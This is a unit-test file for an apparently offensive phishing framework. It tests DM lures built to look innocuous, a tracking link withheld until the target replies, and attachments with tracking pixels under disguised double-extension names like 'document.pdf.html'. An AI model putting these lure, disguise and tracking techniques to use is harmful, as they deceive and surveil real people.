"""Channel-decided DM delivery: the attachment-first strategy, the two-stage
opener with the HELD link, the capture artefact, and the persisted
conversation state that lets a chain finish after a restart.

No network: transports are fakes, the video picker is stubbed and the tracking
links come from an in-memory grabber. The data dir is redirected to a temp
dir so generated artefacts never touch the repo.
"""
import os
import tempfile
import unittest
import unittest.mock

from phantom.automation.social.attachment import (
    attachment_trade,
    build_capture_attachment,
    default_filename,
    safe_name,
)
from phantom.automation.social.persona_state import PersonaState
from phantom.automation.social.social_dm import (
    CHANNEL_CAPABILITIES,
    DMTransport,
    FakeDMTransport,
    dm_plan_marker,
    dm_pretext_category,
    innocuous_dm_pretexts,
    launch_dm_attachment,
    plan_delivery,
    recommended_dm_pretext,
    render_dm_message,
)


# ── the channel matrix ──────────────────────────────────────────────────────

class TestPlanDelivery(unittest.TestCase):

    def test_telegram_prefers_the_attachment(self):
        p = plan_delivery("telegram")
        self.assertEqual(p["strategy"], "attachment")
        self.assertTrue(p["carries_file"])
        self.assertTrue(p["masked_link"])

    def test_instagram_is_conservative(self):
        p = plan_delivery("instagram")
        self.assertEqual(p["strategy"], "two_stage")
        self.assertFalse(p["carries_file"])
        self.assertFalse(p["masked_link"])

    def test_whatsapp_carries_the_artefact_but_not_the_transport(self):
        p = plan_delivery("whatsapp")
        # the strategy stays "attachment" (that IS the right payload) while
        # carries_file says the missing piece is the transport, not the idea
        self.assertEqual(p["strategy"], "attachment")
        self.assertFalse(p["carries_file"])
        self.assertIn("WhatsApp transport", p["needs"])

    def test_unknown_platform_never_claims_a_file(self):
        p = plan_delivery("myspace")
        self.assertEqual(p["strategy"], "two_stage")
        self.assertFalse(p["carries_file"])
        self.assertIn("unknown platform", p["why"])

    def test_forced_attachment_degrades_where_files_are_impossible(self):
        p = plan_delivery("instagram", strategy="attachment")
        self.assertEqual(p["strategy"], "two_stage")

    def test_forced_link_mode_stays_a_link(self):
        self.assertEqual(plan_delivery("telegram", strategy="link")["strategy"],
                         "link")

    def test_marker_is_machine_readable(self):
        line = dm_plan_marker(plan_delivery("instagram"), "@m")
        self.assertTrue(line.startswith("DM_PLAN:"))
        self.assertIn("strategy=two_stage", line)
        self.assertIn("to=@m", line)
        self.assertIn("needs=none", line)

    def test_every_documented_platform_has_a_row(self):
        for plat in ("telegram", "discord", "console", "whatsapp", "instagram",
                     "tiktok", "x", "facebook", "reddit", "email", "sms"):
            self.assertIn(plat, CHANNEL_CAPABILITIES)
            self.assertTrue(plan_delivery(plat)["why"])


# ── the openers ─────────────────────────────────────────────────────────────

class TestInnocuousPretexts(unittest.TestCase):

    def test_the_innocuous_openers_exist(self):
        ids = innocuous_dm_pretexts()
        for pid in ("wrong_recipient", "found_file", "is_this_you",
                    "mentioned_doc"):
            self.assertIn(pid, ids)

    def test_the_default_opener_is_innocuous_and_stable(self):
        pid = recommended_dm_pretext(seed=1)
        self.assertEqual(dm_pretext_category(pid), "innocuous")
        self.assertEqual(pid, recommended_dm_pretext(seed=1))

    def test_legacy_pretexts_are_flagged(self):
        for pid in ("security_verify", "prize", "invoice", "recruiter",
                    "collab"):
            self.assertEqual(dm_pretext_category(pid), "flagged")

    def test_stage_one_carries_no_link(self):
        for pid in innocuous_dm_pretexts():
            body = render_dm_message(pid, {"name": "M"}, link="", stage=1)
            self.assertNotIn("http", body, pid)
            self.assertNotIn("{", body, pid)

    def test_stage_two_carries_the_link(self):
        body = render_dm_message("is_this_you", {}, link="http://t/reel/x",
                                 stage=2)
        self.assertIn("http://t/reel/x", body)

    def test_a_flagged_pretext_keeps_its_single_body(self):
        s1 = render_dm_message("security_verify", {}, link="http://t/x",
                               stage=1)
        s2 = render_dm_message("security_verify", {}, link="http://t/x",
                               stage=2)
        self.assertEqual(s1, s2)
        self.assertIn("http://t/x", s1)

    def test_unknown_pretext_renders_nothing(self):
        self.assertIsNone(render_dm_message("nope", {}, stage=1))


# ── the capture artefact ────────────────────────────────────────────────────

class TestCaptureArtefact(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="phantom_att_")
        self._prev = os.environ.get("PHANTOM_DATA_DIR")
        os.environ["PHANTOM_DATA_DIR"] = self.tmp
        self.addCleanup(self._restore_env)

    def _restore_env(self):
        if self._prev is None:
            os.environ.pop("PHANTOM_DATA_DIR", None)
        else:
            os.environ["PHANTOM_DATA_DIR"] = self._prev

    def test_html_artefact_embeds_the_pixel(self):
        path = build_capture_attachment("dm-abc12345",
                                        "http://t/px/dm-abc12345",
                                        kind="html", title="Relazione")
        with open(path, encoding="utf-8") as f:
            body = f.read()
        self.assertIn("http://t/px/dm-abc12345", body)
        self.assertIn("Relazione", body)
        self.assertTrue(path.endswith(".html"))

    def test_svg_artefact_embeds_the_pixel(self):
        path = build_capture_attachment("dm-abc12345",
                                        "http://t/px/dm-abc12345", kind="svg")
        with open(path, encoding="utf-8") as f:
            body = f.read()
        self.assertIn("<image", body)
        self.assertIn("http://t/px/dm-abc12345", body)

    def test_unknown_kind_falls_back_to_html(self):
        path = build_capture_attachment("c", "http://t/px/c", kind="pdf")
        self.assertTrue(path.endswith(".html"))

    def test_the_pixel_url_is_mandatory(self):
        with self.assertRaises(ValueError):
            build_capture_attachment("c", "")

    def test_a_filename_can_never_escape_the_data_dir(self):
        self.assertEqual(safe_name("../../etc/passwd"), "passwd")
        self.assertNotIn("/", safe_name("..\\..\\win.exe"))
        self.assertEqual(default_filename("svg"), "image.jpg.svg")

    def test_the_operative_extension_is_real_and_last(self):
        # the OS and the chat read the LAST extension: it must be the real
        # one (so the file actually opens), while the name carries the
        # plausible one. `beacon.mp4` (an .exe) does not run — this ordering
        # is what avoids that mistake.
        html_name = default_filename("html")
        self.assertEqual(html_name.rsplit(".", 1)[1], "html")
        self.assertTrue(html_name.endswith(".pdf.html"))
        svg_name = default_filename("svg")
        self.assertEqual(svg_name.rsplit(".", 1)[1], "svg")
        self.assertTrue(svg_name.endswith(".jpg.svg"))

    def test_the_trade_is_reported_honestly(self):
        self.assertIn("reliable", attachment_trade("html")["captures"])
        self.assertIn("viewer", attachment_trade("svg")["captures"])


class _AttachTransport(DMTransport):
    """A file-capable channel (Telegram-shaped), no network."""

    platform = "telegram"
    supports_masked_link = True
    supports_files = True

    def __init__(self):
        self.sent = []
        self.files = []

    def send(self, target, text, timeout=15.0):
        self.sent.append((target, text))
        return True

    def send_document(self, target, path, caption="", filename="",
                      timeout=90.0):
        self.files.append({"to": target, "path": path, "caption": caption,
                           "name": filename})
        return True


class TestLaunchAttachment(unittest.TestCase):

    def test_attachment_needs_a_real_artifact(self):
        ok, lines = launch_dm_attachment(["@m"], "/nope/x.html",
                                         transport=_AttachTransport())
        self.assertFalse(ok)
        self.assertTrue(any("artifact path" in l for l in lines), lines)

    def test_the_plan_line_rides_with_the_attachment(self):
        tmp = tempfile.mkdtemp()
        path = os.path.join(tmp, "d.html")
        with open(path, "w", encoding="utf-8") as f:
            f.write("x")
        t = _AttachTransport()
        ok, lines = launch_dm_attachment(["@m"], path, caption="ciao",
                                         transport=t)
        self.assertTrue(ok, lines)
        self.assertTrue(any(l.startswith("DM_PLAN:")
                            and "strategy=attachment" in l for l in lines),
                        lines)
        self.assertEqual(t.files[0]["caption"], "ciao")

    def test_the_report_counts_the_artefact_as_a_contact(self):
        from phantom.automation.social.social_dm import dm_delivery_report
        rep = dm_delivery_report([
            "DM_PLAN: platform=telegram strategy=attachment carries_file=1 "
            "masked=1 kind=html needs=none",
            "DM_FILE: to=@m platform=telegram name=document.html delivered=1",
            "DM_ATTACH: to=@m platform=telegram strategy=attachment "
            "note=no_link",
        ])
        self.assertEqual(rep["sent"], 1)          # the file WAS the message
        self.assertEqual(rep["delivered"], 1)
        self.assertEqual(rep["files"], 1)
        self.assertEqual(rep["strategies"], ["attachment"])

    def test_a_channel_without_files_says_so(self):
        from phantom.automation.social.social_dm import DiscordDMTransport
        tmp = tempfile.mkdtemp()
        path = os.path.join(tmp, "d.html")
        with open(path, "w", encoding="utf-8") as f:
            f.write("x")
        ok, lines = launch_dm_attachment(
            ["@m"], path, transport=DiscordDMTransport(webhook="w"))
        self.assertFalse(ok, lines)
        self.assertTrue(any("file_delivery_unsupported" in l for l in lines),
                        lines)
        # the strategy itself is still reported (with what is missing)
        self.assertTrue(any("needs=" in l and "needs=none" not in l
                            for l in lines), lines)


# ── the engine dispatch ─────────────────────────────────────────────────────

class _StubServer:
    def __init__(self):
        self.redirects = {}

    def register_redirect(self, code, target):
        self.redirects[code] = target


class _FakeGrabber:
    """In-memory grabber: no server, no sockets."""

    def __init__(self):
        self._server = _StubServer()
        self._default_server = None
        self.links = []

    def _new(self, label, prefix):
        from phantom.automation.social.grabbit import GrabLink
        code = f"{label}-{len(self.links)}"
        self.links.append(code)
        return GrabLink(short_url=f"http://track.local/{prefix}{code}",
                        code=code)

    def create_link(self, label="phish", prefix=""):
        return self._new(label, prefix)

    def create_login_link(self, label="login"):
        return self._new(label, "l/")

    def create_video_share_link(self, label="video", platform="tiktok",
                                handle="", video=None):
        return self._new(label, "reel/")


class TestEngineDeliveryStrategy(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="phantom_dm_")
        self._prev = os.environ.get("PHANTOM_DATA_DIR")
        os.environ["PHANTOM_DATA_DIR"] = self.tmp
        self.addCleanup(self._restore_env)

    def _restore_env(self):
        if self._prev is None:
            os.environ.pop("PHANTOM_DATA_DIR", None)
        else:
            os.environ["PHANTOM_DATA_DIR"] = self._prev

    def _engine(self, transport, state_path=""):
        from phantom.automation.social import social_dm as dm_mod
        from phantom.automation.social.engine import SocialEngine
        eng = SocialEngine()
        eng._grabber = _FakeGrabber()
        eng._state = PersonaState(
            path=state_path or os.path.join(self.tmp, "state.json"))
        eng._discovered.update({"platform": "instagram", "handle": "mario",
                                "username": "mario"})
        # the video picker would hit the network: stub it out
        eng._pick_lure_video = lambda: {"id": "dQw4w9WgXcQ", "title": "t",
                                        "channel": "c"}
        patcher = unittest.mock.patch.object(dm_mod, "get_dm_transport",
                                             return_value=transport)
        patcher.start()
        self.addCleanup(patcher.stop)
        return eng

    def test_attachment_path_sends_a_file_and_no_link(self):
        t = _AttachTransport()
        eng = self._engine(t)
        ok, lines = eng.dm(["@mario"], pretext="is_this_you")
        self.assertTrue(ok, lines)
        self.assertEqual(len(t.files), 1)
        self.assertEqual(t.sent, [])                    # no text message
        self.assertNotIn("http", t.files[0]["caption"])
        self.assertTrue(os.path.isfile(t.files[0]["path"]))
        self.assertTrue(any(l.startswith("DM_ATTACH:") for l in lines), lines)
        # the name on the wire is the plausible one, not the local path
        self.assertEqual(t.files[0]["name"], "document.pdf.html")
        st = eng._state.conversation_status("@mario")
        self.assertEqual(st["strategy"], "attachment")

    def test_two_stage_holds_the_link(self):
        t = FakeDMTransport()
        eng = self._engine(t)
        ok, lines = eng.dm(["@mario"], pretext="found_file")
        self.assertTrue(ok, lines)
        self.assertEqual(len(t.sent), 1)
        self.assertNotIn("http", t.sent[0][1])
        self.assertIn("found a file with your name", t.sent[0][1])
        self.assertTrue(any(l.startswith("DM_STAGE:") and "stage=1" in l
                            for l in lines), lines)
        # the opener is PERSISTED, and the link is not owed until a reply
        st = eng._state.conversation_status("@mario")
        self.assertEqual(st["strategy"], "two_stage")
        self.assertEqual(st["pretext"], "found_file")
        self.assertFalse(eng._state.reply_seen("@mario"))
        self.assertEqual(eng._state.awaiting_stage2(), [])

    def test_a_flagged_pretext_still_sends_its_link(self):
        t = FakeDMTransport()
        eng = self._engine(t)
        ok, lines = eng.dm(["@mario"], pretext="recruiter")
        self.assertTrue(ok, lines)
        self.assertIn("http://track.local/", t.sent[0][1])

    def test_stage_two_waits_for_the_reply(self):
        t = FakeDMTransport()
        eng = self._engine(t)
        eng.dm(["@mario"], pretext="found_file")
        before = len(t.sent)
        ok, lines = eng.dm_second_stage(["@mario"])
        self.assertFalse(ok, lines)                     # nothing was sent
        self.assertTrue(any("awaiting_reply" in l for l in lines), lines)
        self.assertEqual(len(t.sent), before)
        eng._state.mark_reply("@mario")
        ok, lines = eng.dm_second_stage(["@mario"])
        self.assertTrue(ok, lines)
        self.assertEqual(len(t.sent), before + 1)
        self.assertIn("http://track.local/", t.sent[-1][1])
        self.assertTrue(any("stage=2" in l and "delivered=1" in l
                            for l in lines), lines)
        self.assertTrue(eng._state.conversation_status("@mario")["stage2_at"])

    def test_stage_two_survives_a_restart(self):
        state_path = os.path.join(self.tmp, "state.json")
        t = FakeDMTransport()
        eng = self._engine(t, state_path=state_path)
        eng.dm(["@mario"], pretext="is_this_you")
        # the process dies; a NEW engine + NEW state read the same file
        eng2 = self._engine(t, state_path=state_path)
        ok, lines = eng2.dm_second_stage()
        self.assertFalse(ok, lines)                     # reply not seen yet
        eng2._state.mark_reply("@mario")
        before = len(t.sent)
        ok, lines = eng2.dm_second_stage()
        self.assertTrue(ok, lines)
        self.assertEqual(len(t.sent), before + 1)
        self.assertIn("http://track.local/", t.sent[-1][1])

    def test_the_link_is_sent_only_once(self):
        state_path = os.path.join(self.tmp, "state.json")
        t = FakeDMTransport()
        eng = self._engine(t, state_path=state_path)
        eng.dm(["@mario"], pretext="is_this_you")
        eng._state.mark_reply("@mario")
        ok, _ = eng.dm_second_stage()
        self.assertTrue(ok)
        sent = len(t.sent)
        # nothing is owed any more: the derivation says so...
        ok, lines = eng.dm_second_stage()
        self.assertFalse(ok, lines)                     # idempotent
        self.assertTrue(any("no_stage2_pending" in l for l in lines), lines)
        # ...and asking EXPLICITLY about the handle says 'already sent'
        ok, lines = eng.dm_second_stage(["@mario"])
        self.assertFalse(ok, lines)
        self.assertEqual(len(t.sent), sent)
        self.assertTrue(any("already_sent" in l for l in lines), lines)


# ── the persisted conversation ledger ───────────────────────────────────────

class TestConversationState(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="phantom_conv_")
        self.path = os.path.join(self.tmp, "state.json")
        self.now = [1000.0]

    def _state(self):
        return PersonaState(path=self.path, now=lambda: self.now[0])

    def test_the_opener_is_idempotent(self):
        s = self._state()
        s.conversation_start("@m", platform="instagram",
                             pretext="is_this_you", strategy="two_stage")
        first = s.conversation_status("@m")["sent_at"]
        self.now[0] += 500
        s.conversation_start("@m", platform="instagram")
        self.assertEqual(s.conversation_status("@m")["sent_at"], first)

    def test_the_reply_gates_stage_two(self):
        s = self._state()
        s.conversation_start("@m", pretext="found_file", strategy="two_stage")
        self.assertEqual(s.awaiting_stage2(), [])
        self.assertFalse(s.stage2_ready("@m"))
        self.assertTrue(s.stage2_ready("@m", aggressive=True))
        s.mark_reply("@m")
        self.assertTrue(s.reply_seen("@m"))
        self.assertEqual(s.awaiting_stage2(), ["@m"])
        s.stage2_sent("@m")
        self.assertEqual(s.awaiting_stage2(), [])
        self.assertFalse(s.stage2_ready("@m", aggressive=True))

    def test_state_survives_a_restart(self):
        s = self._state()
        s.conversation_start("@m", platform="instagram",
                             pretext="is_this_you", strategy="two_stage")
        self.now[0] += 3600 * 30          # the operator closed phantom for days
        s.mark_reply("@m")
        s2 = self._state()                # a brand-new process
        self.assertEqual(s2.awaiting_stage2(), ["@m"])

    def test_a_v1_state_file_still_loads(self):
        import json
        with open(self.path, "w", encoding="utf-8") as f:
            json.dump({"version": 1,
                       "personas": {"p": {"created_at": 1,
                                          "warmup_deadline": 2}},
                       "follows": {"h": {"accepted": True}}}, f)
        s = self._state()
        self.assertTrue(s._data["personas"])        # not thrown away
        self.assertTrue(s.follow_status("h")["accepted"])
        self.assertEqual(s.conversations(), {})     # it simply has none

    def test_marking_a_reply_for_an_unknown_handle_is_a_no_op(self):
        s = self._state()
        self.assertFalse(s.mark_reply("@ghost"))


# ── markers reach the auto-mode's world model ───────────────────────────────

class TestMarkersAndCapability(unittest.TestCase):

    def _findings(self, out):
        from phantom.automation.belief import WorldModel
        from phantom.automation.guidance.kit import _social_interp
        wm = WorldModel(target="@mario", target_type="username")
        return _social_interp(out, wm, {})

    def test_the_plan_is_learned(self):
        fs = self._findings("DM_PLAN: platform=instagram "
                            "strategy=two_stage carries_file=0 masked=0 "
                            "kind=html to=@mario needs=none")
        plan = [f for f in fs if f.kind == "dm_plan"]
        self.assertEqual(len(plan), 1)
        self.assertEqual(plan[0].value["strategy"], "two_stage")
        self.assertFalse(plan[0].value["carries_file"])

    def test_the_stage_marker_records_the_held_link(self):
        fs = self._findings("DM_STAGE: to=@mario stage=1 of=2 "
                            "note=awaiting_reply link=held")
        st = [f for f in fs if f.kind == "dm_stage"]
        self.assertEqual(len(st), 1)
        self.assertTrue(st[0].value["link_held"])

    def test_an_attachment_counts_as_a_contact(self):
        fs = self._findings("DM_FILE: to=@mario platform=telegram "
                            "name=document.html delivered=1")
        dm = [f for f in fs if f.kind == "dm_sent"]
        self.assertEqual(len(dm), 1)
        self.assertTrue(dm[0].value["delivered"])
        self.assertEqual(dm[0].value["attachment"], "document.html")

    def test_stage_two_is_registered_and_identity_gated(self):
        from phantom.automation.guidance.commands import make_registry
        from phantom.automation.phases.osint.capabilities import (
            OSINT_CAPABILITY_IDS)
        from phantom.automation.phases.osint.adapters import dm_stage2
        from phantom.automation.planner import _FACT_SOURCES
        from phantom.automation.social.identity_confidence import (
            CONTACT_CAPABILITIES)
        cap = make_registry().get("dm_stage2")
        self.assertIsNotNone(cap)
        self.assertEqual(cap.category, "social")
        self.assertIn("dm_sent", cap.effects)
        self.assertIn("dm_stage2", _FACT_SOURCES["dm_sent"])
        self.assertIn("dm_stage2", OSINT_CAPABILITY_IDS)
        self.assertIn("dm_stage2", CONTACT_CAPABILITIES)
        self.assertTrue(callable(dm_stage2))

    def test_an_innocuous_opener_is_the_capability_default(self):
        from phantom.automation.guidance.commands import make_registry
        cap = make_registry().get("dm_launch")
        desc = cap.inputs[0].description
        for pid in innocuous_dm_pretexts():
            self.assertIn(pid, desc)


if __name__ == "__main__":
    unittest.main()
